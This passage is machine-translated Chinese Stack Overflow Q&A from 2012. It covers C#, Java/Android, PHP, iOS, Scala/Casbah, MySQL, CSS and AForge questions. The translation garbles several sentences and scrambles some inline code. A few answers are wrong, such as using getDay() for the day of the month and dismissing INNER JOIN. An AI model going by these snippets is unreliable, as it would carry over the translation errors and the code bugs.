            throw new ExpressionException(lex.ErrorMessage);
        }
        if (parser.HasError)
        {
            throw new ExpressionException(parser.ErrorMessage);
        } 
```

你的 antlr 版本有点旧，但我认为异常可能相同

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:59:38.347

如果我没记错的话，C# 生成的源代码在某些情况下会吞下生成的错误，您需要查询返回的对象以查看是否发生错误。

有些错误你甚至可能需要添加一些额外的代码来捕获。

2 年前我在使用 Antlr 时遇到了类似的问题。

我会检查是否可以找到任何旧代码。

# c# - 对象引用未设置到对象的实例中

> ID：10597513
> 
> 赞同：0
> 
> 时间：2012-05-15T09:09:45.550
> 
> 标签：c#

我正在从数据库表中检索数据。

通过将输入作为 1 in

```
textbox1(voucherno)-->damagedetail = 
                      web.getdamageddetail(Convert.ToInt32(voucherno.Text)); 
```

我想在 textbox2(branchno) 中获取 branchno 作为*输出*

```
branchno.Text = damagedetail.branchno.ToString(); 
```

但我收到错误

> 对象引用未设置到对象的实例中。

检查我的第二行。

第二行编码是否正确？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:12:12.607

`damagedetail.branchno`一片空白。

尝试这个：

```
if (damagedetail.branchno != null)
    branchno.Text = damagedetail.branchno;
else
    branchno.Text = "abcd"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:14:51.250

您的对象属性未填充，因此当您从对象中检索值“branchno”时，该值等于 null，或者您未在“getdamageddetail”方法中填充属性

# java - 在android中的Listener中获取值

> ID：10597514
> 
> 赞同：0
> 
> 时间：2012-05-15T09:09:48.207
> 
> 标签：java, android, listener

我有一些这样的代码：

```
 final int height = 0; //I want to get this height after Predraw view
 view.addOnPreDrawListener(new OnPreDrawListener()
    {

        @Override
        public boolean onPreDraw()
        {
            int myHeight = itemLayout.getMeasuredHeight();
            height = myHeight; //this line has error
            return false;
        }
    }); 
```

问题是我如何从侦听器那里获得价值（尤其是原始类型）。它总是显示

```
 Cannot refer to a non-final variable height inside an inner class defined in a different method 
```

然后我尝试将变量更改为final，它显示错误：

```
 The final local variable height cannot be assigned, since it is defined in an enclosing type 
```

我不知道为什么 API 很难使用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:12:24.947

之前将其声明为**全局** `int myHeight;``onCreate(....)`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T09:14:18.190

您不能在高度初始化时使用“final”，然后再尝试更改它。但是，您可以将变量分配给类而不是函数内。

```
private int tmpHeight = 0; 
```

这将允许您从侦听器中访问变量。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T09:15:03.400

你提到的两个错误都是正确的

1) 内部类内部不能访问非final变量

2) final 变量在初始化后不能改变

将高度声明为类内的全局变量而不是任何方法将解决您的问题

```
 int myHeight; 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-15T09:24:43.067

处理这个问题的最简单方法是让你的`Activity`implement `OnPreDrawListener`.

```
public class MyActivity extends Activity implements OnPreDrawListener{
  int height;

  method(){
    ..
    view.addOnPreDrawListener(this);
    ..
  }

  @Override
  public boolean onPreDraw(){
    height = itemLayout.getMeasuredHeight();
  }  
} 
```

问题不在于 API 的“复杂性”。这是一个真正的 Java 问题，涉及所涉及的各种变量的生命周期。通过不声明变量`height`final，当您的内部匿名类尝试访问它时，它可能会从堆栈中清除。由于必须标记它`final`，你被迫保证它的寿命`height`。

通过执行我的建议，您将 Activity 对象和侦听器对象的生命等同起来。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-15T09:12:38.887

使其成为类级别变量也是一种选择。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-05-15T09:12:39.317

错误不在侦听器中，而是在`height`作为最终变量的声明中。

这意味着它在初始化后无法更改，您必须从中删除final：

```
int height = 0; 
view.addOnPreDrawListener(new OnPreDrawListener() {

    @Override
    public boolean onPreDraw() {
        int myHeight = itemLayout.getMeasuredHeight();
        height = myHeight; 
        return false;
    }
}); 
```

# php - 有没有办法在 PHP 中使用？

> ID：10597515
> 
> 赞同：2
> 
> 时间：2012-05-15T09:09:48.467
> 
> 标签：php, javascript, css

抱歉标题混乱，我不知道如何更好地描述它。

无论如何，这是我目前用于我的网站 Cufon 的“问题”。效果很好。然而，使用 Internet Explorer 8，它变得非常慢。因此我决定使用：

```
<![if !(IE 8)]>
<script type="text/javascript" src="js/myriad-pro.cufonfonts.js"></script>
<script type="text/javascript">Cufon.replace('.example1') ('.example2') ('.example3') ('.example4') ('.example5');
</script>
<![endif]> 
```

这很好用，但并不适用于所有情况。脚本的某些部分在脚本本身中调用了 Cufon，它不起作用，Cufon 仍将显示在 IE8 中（所有负面结果都来自它）。

几个包含的脚本/部分中包含以下代码：

```
<?php
echo "<script language=\"javascript\" type=\"text/javascript\">";
echo "$(document).ready(function() { Cufon.replace('.orderpart1') ('.orderpart2') ('.orderpart3'); });";
echo "</script>";
?> 
```

现在是否可以在 PHP 脚本中做出与 with 相同的语句？所以如果是IE8以外的任何浏览器都会加载Cufon，但如果是IE8就不会加载Cufon？

希望有人明白我在这里的意思，因为这对我来说有点难以解释...... :(

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T09:13:09.080

```
<?php
echo "<![if !(IE 8)]>";
echo "<script language=\"javascript\" type=\"text/javascript\">";
echo "$(document).ready(function() { Cufon.replace('.orderpart1') ('.orderpart2') ('.orderpart3'); });";
echo "</script>";
echo "<![endif]>";
?> 
```

是吗？还是我误解了你的要求？

**编辑：** 另一种方式，我看到你正在使用 jQuery，可能是使用[jQuery 浏览器检测](http://api.jquery.com/jQuery.browser/)：

```
<?php
echo "<script language=\"javascript\" type=\"text/javascript\">";
echo "if ( $.browser.msie && $.browser.version <= 8 ) {";
echo "$(document).ready(function() { Cufon.replace('.orderpart1') ('.orderpart2') ('.orderpart3'); });";
echo "}";
echo "</script>";
?> 
```

**请注意，此功能已弃用：**

> 此属性立即可用。因此使用它来确定是否调用 $(document).ready() 是安全的。$.browser 属性在 jQuery 1.3 中已弃用，它的功能可能会在 jQuery 的未来版本中移动到团队支持的插件中。

如果您确切地知道需要哪种功能并且没有在 IE8 中实现，我建议您使用[`$.support`](http://api.jquery.com/jQuery.support/)用于功能检测而不是浏览器检测的功能。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T09:13:21.880

是的，您可以使用[HTTP_USER_AGENT](http://php.net/manual/en/reserved.variables.server.php)

```
$using_ie8 = (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 8.') !== FALSE); 
```

但我们知道这可以由用户更改。

[这是 IE 的所有用户代理的列表](http://www.useragentstring.com/pages/Internet%20Explorer/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T09:13:57.677

在 PHP 中，您可以使用[get_browser()](http://php.net/manual/en/function.get-browser.php)来检测浏览器及其版本。

```
$browser = get_browser(null, true); 
```

这应该会返回一个包含浏览器信息的数组。

请注意，这将需要 browscap 设置。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T09:12:41.403

基本上，您可以通过过滤来宾的 USER AGENT ^([***[docs]***](http://php.net/manual/en/reserved.variables.server.php))来做到这一点。您可以从服务器变量中获取此信息。

```
$ua = $_SERVER['HTTP_USER_AGENT']; 
```

USER 代理包含打开页面的客人的所有必要信息。到目前为止，我所知道的这种技术的最简单用法是：

```
if (preg_match('~MSIE|Internet Explorer~i', $_SERVER['HTTP_USER_AGENT'])) {
    //do something
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-15T09:13:53.697

只需打印条件注释；

```
<?php
echo "<![if !(IE 8)]>";
echo "<script language=\"javascript\" type=\"text/javascript\">";
echo "$(document).ready(function() { Cufon.replace('.orderpart1') ('.orderpart2') ('.orderpart3'); });";
echo "</script>";
echo "<![endif]>";
?> 
```

# iphone - 异步图片加载错误

> ID：10597520
> 
> 赞同：0
> 
> 时间：2012-05-15T09:10:05.850
> 
> 标签：iphone, ios

我正在尝试异步加载 tableViewCell 中的图像。当我上下移动桌子时，图像会出现，否则不会。

AsyncImageView 包含 NSUrlConnection。它不会进入委托“connectionDidFinishLoading”。但是当我向上或向下移动桌子时，它会进入这个委托函数

下面是代码

```
 CGRect frame;
        frame.size.width=115; frame.size.height=100;
        frame.origin.x=0; frame.origin.y=0;
        AsyncImageView* asyncImage = [[[AsyncImageView alloc]
                                       initWithFrame:frame] autorelease];
        loadingTable=[[UIActivityIndicatorView alloc] initWithFrame:frame];
        [cell.contentView addSubview:loadingTable];
        [loadingTable startAnimating];
        asyncImage.tag = 999;
        NSURL* url = [NSURL URLWithString:[[videoCollection objectAtIndex:indexPath.row] videoImageUrl] ];
        [asyncImage loadImageFromURL:url activity:loadingTable];
        [cell.contentView addSubview:asyncImage]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:12:05.400

首先加载所有图像并将它们添加一些数据结构，如数组，然后将其显示到表格中。不要将您的 UI 与网络调用重叠。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-16T08:35:28.930

相信大家都知道，所有 UI 相关的业务都必须在主线程上完成。但是，下载大量数据可以而且应该在后台完成。而本[教程](http://www.raywenderlich.com/4295/multithreading-and-grand-central-dispatch-on-ios-for-beginners-tutorial)与 Grand Central Dispatch 可能正是您所需要的。

在后台线程中下载图像，完成后，让主线程知道这一点并在主线程上更新 UI。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-16T08:47:03.413

我昨天已经这样做了。

最好的方法是在后台和`- (UITableViewCell *)cellForRowAtIndexPath:(NSIndexPath *)indexPath`方法中调用下载。

当用户想要查看单元格的图像时，此方法将加载它。

但是警告！为了防止多次下载同一个图像，您应该使用数据结构（如字典）来检查图像是否已下载。

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    ...
    if([myPictures objectForKey:indexPath.row] == nil) {
        [self performSelectorInBackground:@selector(downloadPhotoInBackground:) withObject:indexPath];
    }
    return cell
} 
```

在 downloadPhotoInBackground: 中，不要忘记将下载的图像添加到“myPictures”属性中。

# java - 如何在我的小程序中停止缓冲（闪烁）

> ID：10597522
> 
> 赞同：0
> 
> 时间：2012-05-15T09:10:08.717
> 
> 标签：java, graphics, japplet

我正在用 java 小程序制作纸牌游戏。我有一个扩展 JApplet 的类。现在我正在尝试在小程序上绘制 104 张图像，但是当我拖动一张图像并移动时，我的整个小程序都在闪烁。在我的程序的整个执行过程中，我在 mousedragged 和 mousepressed 中调用了 repaint 方法，因为它需要在拖动后在 applet 上重新绘制图像。

我知道每次我拖动一张卡片并在屏幕上移动鼠标时我的绘制方法都会运行，这就是为什么我的 104 张卡片每次都在小程序上重绘。我认为这就是在我的小程序中闪烁的原因。

我尝试了很多次，但没有解决。我怎样才能防止这种闪烁？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T09:49:44.477

查看双缓冲和[BufferStrategy](http://docs.oracle.com/javase/6/docs/api/java/awt/image/BufferStrategy.html)。

曾几何时，您可以自己通过绘制到屏幕外图像然后将屏幕外图像一次性绘制到您的小程序来完成 - 但现在您可以使用 BufferStrategy。这是[有关如何以老式方式进行操作的教程](http://www.realapplets.com/tutorial/DoubleBuffering.html)。BufferStrategy javadoc 向您展示了如何使用新方法。

# java - 连接两个数字

> ID：10597527
> 
> 赞同：2
> 
> 时间：2012-05-15T09:10:27.087
> 
> 标签：java, bigdecimal

如何在 BigDecimal 中连接两个数字？我有这个例子：

```
BigDecimal d = BigDecimal.valueOf(5.5);
        int a = 1;
        int b = 11; 
```

我想在不使用除法或其他操作的情况下连接`d.a`并`d.b`生成`5.501`和输入！`5.511``same length`

是否有使用 BigDecimal 的指令直接制作它？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-15T09:13:25.053

使用可以解析字符串的事实`BigDecimal`，并且字符串易于连接。

```
BigDecimal d = BigDecimal.valueOf(5.5);
int a = 1;
int b = 11;

BigDecimal da = new BigDecimal(String.format("%s%02d", d, a));
BigDecimal db = new BigDecimal(String.format("%s%02d", d, b));

System.out.println(da);
System.out.println(db); 
```

**输出：**

```
5.501
5.511 
```

长度是硬编码的`%02d`。您可以通过检查动态生成格式字符串`String.valueOf(a).length()`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-15T09:13:17.767

```
da = d.add(new BigDecimal("0.00" + a);
db = d.add(new BigDecimal("0.0" + b); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T09:14:15.220

您可以：

*   将它们转换为字符串，连接它们，然后返回一个新的 BigDecimal 对象
*   将 a 和 b 除以 1000，然后将它们添加到 d

# c# - chrome中的Request.Browser.Browser返回“IE”

> ID：10597531
> 
> 赞同：1
> 
> 时间：2012-05-15T09:10:55.020
> 
> 标签：c#, asp.net, google-chrome

我正在尝试在 ASP.Net C# 代码隐藏中执行“如果浏览器是 IE 并且低于版本 9”。

但是，在 chrome 中，以下行：

```
if (Request.Browser.Browser == "IE" && Request.Browser.MajorVersion < 9) 
```

分别输出为“IE”和 5。尽管使用 Chrome v18。

获取用户浏览器的正确用法是什么？或者这只是我的 Chrome 版本？这可能真的很简单，但我确信这段代码以前有效

用户代理注册为： `Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.168 Safari/535.19`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T09:18:24.320

我有 v19，我确实看到了正确的值。你确定你没有任何模拟器（用户代理模拟器）或类似的东西......

`chrome 19`

```
Browser Capabilities
Type = Chrome19
Name = Chrome
Version = 19.0
Major Version = 19
Minor Version = 0
Platform = WinNT
Is Beta = False
Is Crawler = False
Is AOL = False
Is Win16 = False
Is Win32 = True
Supports Frames = True
Supports Tables = True
Supports Cookies = True
Supports VBScript = False
Supports JavaScript = 3.0
Supports Java Applets = True
Supports ActiveX Controls = False
Supports JavaScript Version = 1.7 
```

`ie 8`

```
Browser Capabilities
Type = IE7
Name = IE
Version = 7.0
Major Version = 7
Minor Version = 0
Platform = WinNT
Is Beta = False
Is Crawler = False
Is AOL = False
Is Win16 = False
Is Win32 = True
Supports Frames = True
Supports Tables = True
Supports Cookies = True
Supports VBScript = True
Supports JavaScript = 3.0
Supports Java Applets = True
Supports ActiveX Controls = True
Supports JavaScript Version = 1.5 
```

这是此输出的代码：

```
 string s = "Browser Capabilities\n"
            + "Type = " + browser.Type + "\n"
            + "Name = " + browser.Browser + "\n"
            + "Version = " + browser.Version + "\n"
            + "Major Version = " + browser.MajorVersion + "\n"
            + "Minor Version = " + browser.MinorVersion + "\n"
            + "Platform = " + browser.Platform + "\n"
            + "Is Beta = " + browser.Beta + "\n"
            + "Is Crawler = " + browser.Crawler + "\n"
            + "Is AOL = " + browser.AOL + "\n"
            + "Is Win16 = " + browser.Win16 + "\n"
            + "Is Win32 = " + browser.Win32 + "\n"
            + "Supports Frames = " + browser.Frames + "\n"
            + "Supports Tables = " + browser.Tables + "\n"
            + "Supports Cookies = " + browser.Cookies + "\n"
            + "Supports VBScript = " + browser.VBScript + "\n"
            + "Supports JavaScript = " +
                browser.EcmaScriptVersion.ToString() + "\n"
            + "Supports Java Applets = " + browser.JavaApplets + "\n"
            + "Supports ActiveX Controls = " + browser.ActiveXControls
                  + "\n"
            + "Supports JavaScript Version = " +
                browser["JavaScriptVersion"] + "\n"; 
```

# c# - Caliburn Micro：对话结果

> ID：10597534
> 
> 赞同：5
> 
> 时间：2012-05-15T09:11:11.203
> 
> 标签：c#, wpf, caliburn.micro, dialogresult

我找不到以下问题的解决方案：

我使用 caliburn micro 的 WindowManager 打开一个对话框：

```
public void UserNew()
{
   this._windowManager.ShowDialog(new UserViewModel(this._windowManager));
} 
```

现在，当用户使用 OK 按钮关闭对话框时，我需要一个 DialogResult。WindowManager 的 ShowDialog 方法不返回 DialogResult...

谁能帮我？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-10-10T10:26:51.483

**在继承自Screen**的对话框视图模型中的 caliburn micro 中，您可以执行以下操作：

```
TryClose(true); // for OK 
```

或者

```
TryClose(false); // for Cancel 
```

那么你可以这样做：

```
var vm = IoC.Get<MyViewModel>();
var r = WindowManager.ShowDialog(vm, null, null);

if (r.HasValue && r.Value) {
  // do something on OK
} 
```

您的对话框 xaml 可能如下所示：

```
<Button Content="OK" cal:Message.Attach="[Event Click] = [AcceptButton()]" />
<Button Content="Cancel" cal:Message.Attach="[Event Click] = [CancelButton()]" /> 
```

使用这个命名空间：

```
xmlns:cal="http://www.caliburnproject.org" 
```

这是对话框视图模型实现的详细代码示例：

```
public bool CanAcceptButton
{
  get { return true; /* add logic here */ }
}

public void AcceptButton()
{
  TryClose(true);
}

public bool CanCancelButton
{
  get { return true; }
}

public void CancelButton()
{
  TryClose(false);
} 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-05-15T16:07:18.520

我倾向于使用视图模型来确定对话框中发生了什么。例如，您可以拥有一个`IsCancelled`属性`UserViewModel`，您可以在通话返回后对其进行询问`ShowDialog`。就像是：

```
public void UserNew() {
    var userViewModel = new UserViewModel(this._windowManager);
    this._windowManager.ShowDialog(userViewModel);
    if (userViewModel.IsCancelled) {
        // Handle cancellation
    } else {
        // Handle other case(s)
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T09:27:06.550

WPF 对话框返回可为空的布尔值，而不是 DialogResults。Caliburn 的 ShowDialog 也返回`bool?`

来自[MSDN](http://msdn.microsoft.com/en-us/library/system.windows.window.showdialog.aspx)

> 对话框通常允许用户接受或取消在对话框关闭之前显示的任务。ShowDialog 返回一个 Nullable 布尔值，该值指定活动是被接受还是被取消。返回值是窗口关闭前 DialogResult 属性的值。有关详细信息，请参阅 DialogResult。

`DialogResult`以上是指`bool`名为 DialogResult on 的属性`System.Windows.Window`。

如果您想返回更复杂的内容，只需在窗口上定义自己的枚举属性，并在对话框关闭后读取其值。

# javascript - 获取带有特定时间戳的今天日期

> ID：10597536
> 
> 赞同：1
> 
> 时间：2012-05-15T09:11:15.970
> 
> 标签：javascript, jquery, datetime

我正在使用[这个日期时间选择器](http://trentrichardson.com/examples/timepicker/)，并希望将 minDate 设置为今天上午 8 点。

timepicker 具有`minDate`可以接受输入的属性，例如`new Date(2012, 05, 15, 8, 00)`. 我希望它能够做类似的事情`new Date(getFullYear(), getMonth(), getDate(), 8, 00)`，但这似乎不起作用。

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T09:14:17.270

您可以使用当前日期/时间创建一个`Date`对象 ( [MDN](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Date) )，然后将其调整为您的需要，如下所示，然后将其传递给日期时间选择器。

```
var minToday = new Date();
minToday.setHours( 8 );
minToday.setMinutes( 0 ); 
```

请注意，这使用的是用户的本地时间，可能与您的服务器时间不同！

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T09:14:40.310

您需要先使用今天的日期

```
var today = new Date(); 
```

然后在`today`.

```
new Date(today.getFullYear(), today.getMonth(), today.getDay(), 8, 00) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T09:16:40.273

好吧...如果您必须在将其作为参数传递时进行所有计算，请尝试

```
(function(){var d = new Date();d.setHours(8);d.setMinutes(0);d.setSeconds(0);return d;})() 
```

# scala - 如何创建与 Casbah 的 Mongo 副本集连接？

> ID：10597541
> 
> 赞同：1
> 
> 时间：2012-05-15T09:11:31.557
> 
> 标签：scala, mongodb, casbah

我是 scala 和 casbah 的新手。我正在尝试使用 casbah 创建一个 mongo 副本集连接。这是我的代码。我很确定我的 mongo 副本设置是正确的。当我通过 ruby​​ 创建连接时，效果很好。我在这里错过了一些愚蠢的东西。当我用谷歌搜索时，我得到了这个文档，这是我用来参考的。

[http://api.mongodb.org/scala/casbah/current/scaladoc/com/mongodb/casbah/MongoConnection](http://api.mongodb.org/scala/casbah/current/scaladoc/com/mongodb/casbah/MongoConnection) $.html

```
import com.mongodb.casbah.Imports._ 

object MongoAnalysisDB {
  def main(args: Array[String]) = {
    //that connection
    val addresses = List("127.0.0.1:27018", "127.0.0.1:27019", "127.0.0.1:27020")
    val mongoConn = MongoConnection(replicaSetSeeds: addresses) 
    val mongoDB = mongoConn("vimana-sandbox-dup") 
    val mongoColl = mongoConn("vimana-sandbox-dup")("utilization.metrics.cycledowntime") 

    //that query
    val loadEvent = MongoDBObject("period" -> "PT1H") 
    val cursor = mongoColl.find(loadEvent)
    val mtcevent = mongoColl.findOne(loadEvent)

    //that document
    println(mtcevent)
  }
} 
```

我收到以下错误。

```
[info] Compiling 1 Scala source to /home/deepak/scala-mongo-oplog-watcher/target/scala-2.9.1/classes...
[error] /home/deepak/scala-mongo-oplog-watcher/src/main/scala/reader.scala:6: ')' expected but '(' found.
[error]     val mongoConn = MongoConnection(replicaSetSeeds: List("127.0.0.1:27018", "127.0.0.1:27019", "127.0.0.1:27020")) 
[error]                                                          ^
[error] /home/deepak/scala-mongo-oplog-watcher/src/main/scala/reader.scala:6: ';' expected but ')' found.
[error]     val mongoConn = MongoConnection(replicaSetSeeds: List("127.0.0.1:27018", "127.0.0.1:27019", "127.0.0.1:27020")) 
[error]                                                                                                                   ^
[error] two errors found
[error] {file:/home/deepak/scala-mongo-oplog-watcher/}default-b16d47/compile:compile: Compilation failed 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T10:11:13.373

将 ip 字符串和端口包装成`ServerAddress`工作。

```
import com.mongodb._ 
import com.mongodb.casbah.Imports._ 

object MongoAnalysisDB {
  def main(args: Array[String]) = {
    //that connection
    val addresses = List(new ServerAddress("127.0.0.1" , 27018),  new ServerAddress("127.0.0.1" , 27019),  new ServerAddress( "127.0.0.1" , 27020 ))
    val mongoConn = MongoConnection(addresses) 
    val mongoDB = mongoConn("vimana-sandbox-dup") 
    val mongoColl = mongoConn("vimana-sandbox-dup")("utilization.metrics.cycledowntime") 

    //that query
    val loadEvent = MongoDBObject("period" -> "PT1H") 
    val cursor = mongoColl.find(loadEvent)
    val mtcevent = mongoColl.findOne(loadEvent)

    //that document
    println(mtcevent)
  }
} 
```

另见： http: [//mongodb.github.io/casbah/3.1/reference/connecting/#connecting-to-replicasets-mongos](http://mongodb.github.io/casbah/3.1/reference/connecting/#connecting-to-replicasets-mongos)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-10-22T07:53:55.453

您还可以使用 MongoClientURI 使用 RS 连接

```
val mongoClient = MongoClient(MongoClientURI("mongodb://localhost:27018,localhost:27019,localhost:27020")) 
```

# c# - 如何将单元格内容重置为“System.DBNull”

> ID：10597543
> 
> 赞同：0
> 
> 时间：2012-05-15T09:11:37.257
> 
> 标签：c#, wpf, datagrid

我有一个 WPF `DataGrid`，`DataTable`它的`ItemsSource`. 网格仅用于`double`值。但是，对于某些单元格没有指定数据，因此值可以是`null`。（实际上类型是`DBNull`）。这一切都很好，直到我开始编辑一个单元格，然后决定我不想要该单元格中的任何值，然后尝试将其留空并继续。`DataGrid`不让我这样做。我怎样才能让它以某种方式工作，以便我可以根据需要将初始`null`值重置为单元格？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:16:27.287

您必须使用值转换器...因此，如果单元格为空，您可以将值设置为 DBNull。但我认为你必须手动定义列......

在xml中：

```
<Window xmlns:conv="PathToConverter">
<Window.Resources>
    <conv:ValueConverter x:Key="valueConverter" />
</Window.Resources>
...
    <DataGrid.Columns>
        <DataGridTextColumn Header=""
                            Binding="{Binding doubleValue
                                    , Converter={StaticResource valueConverter}
                                    , Mode=TwoWay}"/>
        ...
    </DataGrid.Columns>
...
</Window> 
```

您的转换器类必须实现`IValueConverter`接口

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:31:28.807

您在验证方面遇到问题吗？

否则，我相信，只需“Esc”-ing 就会取消当前的编辑。

# java - Java 中的 Application.DoEvents() 等价物？

> ID：10597544
> 
> 赞同：1
> 
> 时间：2012-05-15T09:11:39.330
> 
> 标签：java, swing

我正在用 Java 运行一个程序，它执行一个很长的过程。显然，这会导致事件调度程序线程变得非常忙碌，因此停止响应/更新 UI。

我希望它在执行此过程时更新 UI（我在运行时将一些信息返回给用户）。我意识到这样做的正确方法是使用摆动工作线程或其他多线程解决方案 - 但对于这种情况，假设我不能让它过于复杂。

现在在 C# 中有一个名为“Application.DoEvents()”的肮脏修复程序，它强制 UI 自行更新 - 这给出了我正在寻找的结果。Java中有类似的东西吗？我只想快速插入循环，而无需中断多线程。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:15:09.470

> 我意识到这样做的正确方法是使用摆动工作线程或其他多线程解决方案 - 但对于这种情况，假设我不能让它过于复杂。

Swing worker 专为此类任务而设计。这是你应该在 swing 中编写应用程序的方式。“我不能让它太复杂”是什么意思？

# mysql - MySQL - 如果 LEFT OUTER JOIN 中不存在行，则排除行

> ID：10597546
> 
> 赞同：0
> 
> 时间：2012-05-15T09:11:43.227
> 
> 标签：mysql, database

我有一个 SQL 查询在一定程度上可以正常工作。

LEFT OUTER JOIN 工作正常，但如果 mdl_modules 或 mdl_resource 中没有记录，它会出现 NULL。

如何从 mdl_course_modules 中排除记录，其中任何一个 LEFT OUTER JOIN 都没有记录？

我想我会使用 ISNULL() 但不确定与我的查询合并的正确语法。

这是我的查询：

```
SELECT SQL_CALC_FOUND_ROWS ".str_replace(" , ", " ", "cm.id AS theid, m.name AS mname, r.name AS resourcename, r.summary AS resourcesummary,
        FROM_UNIXTIME(cm.added, '%D %M %Y') AS dateadded")."
        FROM mdl_course_modules cm 
        LEFT OUTER JOIN mdl_modules m on cm.module = m.id
        LEFT OUTER JOIN mdl_resource r on cm.instance = r.id
        WHERE m.name = 'resource' AND cm.visible = 1
        $scourse
        $sWhere
        $sOrder
        $sLimit 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:20:09.903

通常这可以通过切换到 a 来完成`INNER JOIN`，但[`INNER JOIN`](http://dev.mysql.com/doc/refman/5.0/en/join.html)在 MySql 中相当于 a `CROSS JOIN`，因此实际上无济于事。

要解决此问题，请添加所需的`WHERE`条件，使用`ISNULL`：

```
SELECT ...
    FROM_UNIXTIME(cm.added, '%D %M %Y') AS dateadded")."
    FROM mdl_course_modules cm 
    LEFT OUTER JOIN mdl_modules m on cm.module = m.id
    LEFT OUTER JOIN mdl_resource r on cm.instance = r.id
    WHERE m.name = 'resource' AND cm.visible = 1
        && (!ISNULL(m.name) || !ISNULL(r.name)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T09:49:29.257

WHERE m.name = 'resource' AND cm.visible=1 AND (m.id IS NOT NULL OR r.id IS NOT NULL)

# css - CSS3 背景尺寸：包含；

> ID：10597549
> 
> 赞同：3
> 
> 时间：2012-05-15T09:12:07.820
> 
> 标签：css, background-image

我对一些新的 CSS3 背景命令有点坚持，想知道是否有人可以建议？

我正在尝试创建一个具有动态缩放到屏幕/浏览器大小的背景图像。

这是我想要实现的效果的示例，这是在 <body> 标签上运行的[http://www.css3.info/demos/background-size-contain.html](http://www.css3.info/demos/background-size-contain.html)

我遇到的问题是 < body > 标签不需要定义高度或宽度，但是 < div > 可以，这是我的代码：

```
<!DOCTYPE html> 
<html> 
<head> 
<title>background-size: contain;</title> 
<style type="text/css"> 

#please_expand {
background-image: url(images/betweengrassandsky.png);
background-repeat: no-repeat;
background-attachment: fixed;
background-color: #EEE;
background-size: contain;
}
</style>

<body>
<div id="please_expand">
    <h1>Example J - background-size: contain;</h1>
</div>
</body> 
</html> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T09:41:02.357

在块元素（如`div`）上，高度与宽度的工作方式不同。如果您不指定高度，则元素将与其内容一样高。那是一回事。

`height: 100%`如果您希望您的 div 尽可能大，`body`那将是一种方法，但诀窍是[百分比高度始终来自父级的 height](http://www.w3.org/TR/CSS21/visudet.html#the-height-property)。因此，您必须为跨浏览器结果设置`height: 100%`所有父级（包括）。`html`

```
html,body,#please_expand { height: 100%; } 
```

[jsFiddle 演示](http://jsfiddle.net/rrjrz/)

# c# - aforge中的垂直直方图和水平直方图

> ID：10597550
> 
> 赞同：1
> 
> 时间：2012-05-15T09:12:11.293
> 
> 标签：c#, aforge

如何获取文本图像的垂直直方图或水平直方图，以将文本分割成线条和连接的单词？我将 aforge 用于：

```
HorizontalIntensityStatistics his = new HorizontalIntensityStatistics(pic);            
Histogram histogram = his.Gray; 
```

但它不起作用，我看不到直方图。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-27T01:31:55.917

如果不将直方图插入某种图表组件，您将无法看到某些东西。AForge 生成的是每行 (for ) 或列 (for )`Histogram`的值总和列表（在属性中表示为`int`s的数组）。`Values``HorizontalIntensityStatistics``VerticalIntensityStatistics`

如果您有一个白色背景上的黑色文本的完美二进制图像，则表示行之间前导的像素行将全是白色，因此它们`VerticalIntensityStatistics`在`(imageWidth * 255)`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-01-31T08:35:59.937

您可以自己绘制图像。

```
public static Bitmap GetImage(this AForge.Math.Histogram hist) {
        var img = new Emgu.CV.Image<Gray,byte>(hist.Values.Length, 100,new Gray(255));
        for (int i = 0; i < hist.Values.Length; i++) {
            CvInvoke.Line(img, new Point(i,100), new Point(i,100 - (int)(hist.Values[i]/hist.Max)), new MCvScalar(0, 0, 0));
        }
        return img.Bitmap;} 
```

在这段代码中，我使用了**EmguCV**，但您可以使用这些`System.Drawing`方法。看看这个[答案](https://stackoverflow.com/a/11403288/1089674)。

* * *

